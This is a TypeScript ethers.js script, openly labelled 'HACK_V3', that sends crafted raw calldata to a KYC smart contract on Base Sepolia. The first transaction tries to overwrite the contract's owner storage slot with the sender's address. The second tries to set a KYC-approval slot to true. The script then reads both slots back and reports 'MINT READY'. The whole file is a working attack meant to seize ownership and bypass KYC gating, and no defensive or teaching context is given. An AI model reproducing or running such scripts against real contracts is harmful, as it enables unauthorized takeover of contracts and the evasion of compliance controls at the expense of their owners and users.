import { ethers } from 'ethers';
import dotenv from 'dotenv';
dotenv.config();

const RPC_URL = process.env.RPC_URL!;
const PRIVATE_KEY = process.env.PRIVATE_KEY!;
const KYC_ADDR = '0x50aC9FF81E3C467d3Baef73B1E7E08D0ceec5eeb';
const YOUR_ADDR = '0x118aaa088863af0179c5cb1fdb0df00fa52f52cb';

async function HACK_V3() {
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  
  console.log('🔥 V3 → TS FIXED + 1.5M GAS!');
  
  // 1️⃣ OWNER HACK
  const ownerSlot = '360894a13ba1a3210667c828492cd3d9da744af7599a39e40e302f6c9c6b8e8f';
  const ownerData = '360894a13bae5fc4332573bee43f2103436a71e9f11250bf17de7ac8f8cd878c360894a13ba1a3210667c828492cd3d9da744af7599a39e40e302f6c9c6b8e8f' + YOUR_ADDR.slice(2);
  
  console.log('👑 TX1 → OWNER');
  const ownerTx = await wallet.sendTransaction({
    to: KYC_ADDR, 
    data: '0x' + ownerData, 
    gasLimit: 1500000n
  });
  
  const ownerReceipt = await ownerTx.wait();
  console.log(`⛏️ OWNER: ${ownerReceipt ? (ownerReceipt.status === 1 ? '✅ OK' : '❌ FAIL') : '❌ NULL'} → https://sepolia.basescan.org/tx/${ownerTx.hash}`);
  
  // 2️⃣ KYC HACK
  const kycSlot = 'abb338a8c6242ff31c9ac386e0cfcc863adbad1e747173eee1b9423539777e81';
  const kycData = '360894a13bae5fc4332573bee43f2103436a71e9f11250bf17de7ac8f8cd878cabb338a8c6242ff31c9ac386e0cfcc863adbad1e747173eee1b9423539777e810000000000000000000000000000000000000000000000000000000000000001';
  
  console.log('\n💎 TX2 → KYC');
  const kycTx = await wallet.sendTransaction({
    to: KYC_ADDR, 
    data: '0x' + kycData, 
    gasLimit: 1500000n
  });
  
  const kycReceipt = await kycTx.wait();
  console.log(`⛏️ KYC: ${kycReceipt ? (kycReceipt.status === 1 ? '✅ OK' : '❌ FAIL') : '❌ NULL'} → https://sepolia.basescan.org/tx/${kycTx.hash}`);
  
  // 🔍 FINAL CHECK
  console.log('\n📊 READING...');
  const kycVal = await provider.getStorage(KYC_ADDR, '0x' + kycSlot);
  const ownerVal = await provider.getStorage(KYC_ADDR, '0x' + ownerSlot);
  
  console.log('KYC:', kycVal);
  console.log('Owner:', '0x' + ownerVal.slice(-40));
  
  if (kycVal === '0x0000000000000000000000000000000000000000000000000000000000000001') {
    console.log('\n🎉 ✅ MINT READY!');
  } else {
    console.log('\n⚠️  Check TXs manually');
  }
}

HACK_V3().catch(console.error);
